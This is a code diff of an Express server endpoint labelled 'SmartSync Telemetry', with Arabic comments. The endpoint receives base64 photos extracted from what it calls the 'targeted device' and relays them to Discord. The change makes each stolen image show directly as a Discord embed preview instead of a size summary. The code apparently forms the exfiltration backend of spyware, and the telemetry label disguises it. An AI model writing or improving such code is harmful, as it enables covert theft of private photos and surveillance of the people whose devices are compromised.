@@ -30,17 +30,20 @@ app.post('/api/telemetry', async (req, res) => {
 
         let discordPayload = {};
 
-        // 1. معالجة الصور المرسلة بصيغة Base64 وعرضها بشكل احترافي
+        // 1. معالجة الصور المرسلة بصيغة Base64 وعرضها كمعاينة مرئية مباشرة في ديسكورد
         if (Array.isArray(body) && body.length > 0 && body[0].photo_chunk) {
-            const base64Length = body[0].photo_chunk.length;
+            const base64Image = body[0].photo_chunk;
             discordPayload = {
-                content: `📸 **تم استلام وتأكيد سحب صورة جديدة بدقة عالية من الجهاز المستهدف!**`,
+                content: `📸 **تم استلام صورة جديدة بدقة عالية وعرضها مباشرة من الجهاز المستهدف!**`,
                 embeds: [
                     {
                         title: `🖼️ معاينة الصورة المستخرجة (Asset ID: ${body[0].asset_id || 'N/A'})`,
                         color: 3066993,
-                        description: `تم تلقي حزمة البيانات البصرية بنجاح تام.\n- **حجم البيانات المعالجة:** \`${base64Length} بايت\`\n- **الحالة:** مُستخرجة وخالية من التكرار.\n- **الوقت:** \`${new Date().toLocaleString()}\``,
-                        footer: { text: 'SmartSync Telemetry - Photo Module' }
+                        image: {
+                            url: `data:image/jpeg;base64,${base64Image}`
+                        },
+                        timestamp: new Date().toISOString(),
+                        footer: { text: 'SmartSync Telemetry - Live Visual' }
                     }
                 ]
             };
